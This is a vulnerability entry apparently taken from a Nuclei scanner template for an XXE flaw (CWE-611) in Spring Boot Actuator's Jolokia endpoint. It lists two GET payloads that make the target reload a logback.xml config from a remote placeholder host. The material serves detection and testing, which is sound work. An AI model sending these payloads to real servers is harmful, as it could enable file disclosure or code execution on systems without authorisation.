# Vulnerability: Spring Boot Actuators (Jolokia) XXE
**Classification:** CWE-611
**Source:** Nuclei Template (`springboot-actuators-jolokia-xxe.yaml`)

## Description
A vulnerability in Spring Boot Actuators's 'jolokia' endpoint allows remote attackers to perform an XML External Entities (XXE) attack and include content stored on a remote server as if it was its own. This has the potential to allow the execution of arbitrary code and/or disclosure of sensitive information from the target machine.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
GET {{BaseURL}}/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml
```

